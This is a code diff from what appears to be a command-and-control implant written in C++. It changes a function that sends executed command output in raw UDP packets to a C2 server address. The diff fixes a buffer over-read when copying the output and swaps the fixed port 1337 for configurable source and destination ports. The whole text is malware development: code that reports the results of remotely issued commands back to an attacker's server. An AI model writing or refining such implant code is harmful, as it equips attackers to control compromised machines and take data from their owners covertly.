@@ -40,8 +40,14 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             bpHeader.header_type = 0x03;
             bp_response.host_ip = rawSocket.getIP();
             bp_response.command_num = htonl(currentCmd);
-            memcpy(bp_response.data, output.c_str(), 500);
-            bp_response.data_len = htons(static_cast<uint16_t>(output.length()));
+            if (output.length() > sizeof(bp_response.data)) {
+                bp_response.data_len = htons(static_cast<uint16_t>(sizeof(bp_response.data)));
+                memcpy(bp_response.data, output.c_str(), sizeof(bp_response.data));
+            } 
+            else {
+                bp_response.data_len = htons(static_cast<uint16_t>(output.length()));
+                memcpy(bp_response.data, output.c_str(), output.length());
+            }
 
             auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
             auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_response);
@@ -53,8 +59,8 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             // Sending the command output to the C2
             std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                                       c2Ip,
-                                                      1337,
-                                                      1337,
+                                                      srcPort,
+                                                      dstPort,
                                                       payload,
                                                       rawSocket.getMac(),
                                                       nextHopMac);
@@ -63,8 +69,8 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             // Sending the command output to the C2
             std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                 c2Ip,
-                1337,
-                1337,
+                srcPort,
+                dstPort,
                 payload);
 
 #endif
@@ -106,15 +112,15 @@ void BPHelper::requestAction() {
 #if defined(_WIN32) || defined(WIN32)
     std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                             c2Ip,
-                                            1337,
-                                            1337,
+                                            srcPort,
+                                            dstPort,
                                             payload);
     rawSocket.send(req);
 #else
     std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                               c2Ip,
-                                              1337,
-                                              1337,
+                                              srcPort,
+                                              dstPort,
                                               payload,
                                               rawSocket.getMac(),
                                               nextHopMac);
